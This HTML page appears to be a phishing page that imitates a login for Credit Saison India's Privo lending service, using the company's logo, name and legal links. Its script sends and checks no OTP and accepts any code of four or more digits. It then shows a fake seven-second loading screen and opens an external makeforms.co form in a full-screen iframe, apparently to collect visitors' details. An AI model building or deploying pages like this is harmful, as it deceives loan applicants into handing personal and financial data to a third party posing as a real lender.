<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OTP Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: #f4f4f4;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container, .loading-screen, #form-screen {
            background: #ffffff;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        .login-container img {
            max-width: 150px;
            margin-bottom: 1rem;
        }
        .login-container h2 {
            margin-bottom: 1.5rem;
            color: #333333;
        }
        .login-container input[type="text"] {
            width: 100%;
            padding: 0.75rem;
            margin-bottom: 1rem;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 1rem;
        }
        .login-container input[type="checkbox"] {
            margin-right: 0.5rem;
        }
        .terms {
            font-size: 0.75rem;
            color: #555;
            text-align: left;
            margin-bottom: 1rem;
        }
        .terms a {
            color: #007bff;
            text-decoration: none;
        }
        .terms a:hover {
            text-decoration: underline;
        }
        .login-container button {
            width: 100%;
            padding: 0.75rem;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #0056b3;
        }
        iframe {
            width: 100vw;
            height: 100vh;
            border: none;
        }
        .loading-screen {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: #ffffff;
            height: 100vh;
            width: 100vw;
            font-size: 1.2rem;
            color: #007bff;
            font-weight: bold;
            animation: fadein 2s ease-in-out;
        }
        .loader {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #007bff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes fadein {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="login-container" id="login-screen">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Credit_Saison_logo.png" alt="Credit Saison Logo">
        <h2>Login</h2>
        <input type="text" id="mobile" placeholder="Enter Mobile Number" maxlength="10">
        <input type="text" id="otp" placeholder="Enter OTP" maxlength="6" style="display:none;">
        <div class="terms">
            <label><input type="checkbox" id="terms"> By continuing, you agree to Credit Saison Indiaâ€™s <a href="https://regulatory.creditsaison.in/privo-terms-conditions" target="_blank">Terms & Conditions</a> and <a href="https://regulatory.creditsaison.in/privacy-policy" target="_blank">Privacy Policy</a> and to receive communications from Privo via SMS, Email, Phone & WhatsApp.</label>
        </div>
        <button id="send-otp">Send OTP</button>
    </div><div class="loading-screen" id="loading-screen">
    <div class="loader"></div>
    <div>Loading, please wait...</div>
</div>

<div id="form-screen" style="display:none; height:100vh; width:100vw;">
    <iframe src="https://eu.makeforms.co/pcsy7zl" allowfullscreen></iframe>
</div>

<script>
    const sendOtpBtn = document.getElementById('send-otp');
    const mobileInput = document.getElementById('mobile');
    const otpInput = document.getElementById('otp');
    const loginScreen = document.getElementById('login-screen');
    const loadingScreen = document.getElementById('loading-screen');
    const formScreen = document.getElementById('form-screen');
    const termsCheckbox = document.getElementById('terms');

    sendOtpBtn.addEventListener('click', function() {
        if (!termsCheckbox.checked) {
            alert('Please agree to the Terms & Conditions and Privacy Policy.');
            return;
        }

        if (otpInput.style.display === 'none') {
            // First click - after entering mobile number
            if (mobileInput.value.length === 10) {
                otpInput.style.display = 'block';
                sendOtpBtn.textContent = 'Verify OTP';
            } else {
                alert('Please enter a valid 10-digit mobile number.');
            }
        } else {
            // Second click - after entering OTP
            if (otpInput.value.length >= 4) { // accept any otp 4 digits or more
                loginScreen.style.display = 'none';
                loadingScreen.style.display = 'flex';

                setTimeout(() => {
                    loadingScreen.style.display = 'none';
                    formScreen.style.display = 'block';
                }, 7000); // 7 seconds loading screen
            } else {
                alert('Invalid OTP. Please enter a valid OTP.');
            }
        }
    });
</script>

</body>
</html>
